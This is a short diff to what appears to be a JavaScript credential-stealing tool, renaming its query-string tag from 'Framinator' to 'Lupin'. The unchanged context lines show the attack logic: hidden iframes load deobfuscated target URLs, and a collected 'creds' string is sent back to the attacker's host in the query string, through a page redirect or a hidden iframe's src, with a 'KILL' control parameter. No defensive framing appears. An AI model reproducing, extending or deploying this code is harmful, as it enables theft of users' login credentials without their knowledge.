@@ -48,7 +48,7 @@
             slaveFrame = document.createElement("IFRAME"); 
 
             if (slaveFrameNum == -1){ 
-                d_src = "http://"+document.location.hostname+"?Framinator=NOTHING"           
+                d_src = "http://"+document.location.hostname+"?Lupin=NOTHING"           
             }else{
                 src = targets[targetIndexArray[slaveFrameNum]];
                 d_src = deobfs(src);
@@ -127,11 +127,11 @@
             {
                if(cut > -1) 
                {     
-                   src = "http://"+document.location.hostname+"?Framinator=KILL&creds=";          
+                   src = "http://"+document.location.hostname+"?Lupin=KILL&creds=";          
                    document.location.replace(src+creds.substring(0,cut));               
                }else
                {
-                   src = "http://"+document.location.hostname+"?Framinator=KILL";
+                   src = "http://"+document.location.hostname+"?Lupin=KILL";
                    document.location.replace(src)
                }
             }else
@@ -142,7 +142,7 @@
                {   
                    //alert(creds+"\n"+creds.substring(0,cut));
 
-                   src = "http://"+document.location.hostname+"?Framinator=1&creds=";
+                   src = "http://"+document.location.hostname+"?Lupin=1&creds=";
                    sendFrame = document.getElementsByName("slaveFrame-1")[0];
                    sendFrame.setAttribute('src',src+creds.substring(0,cut));               
                    creds = "";
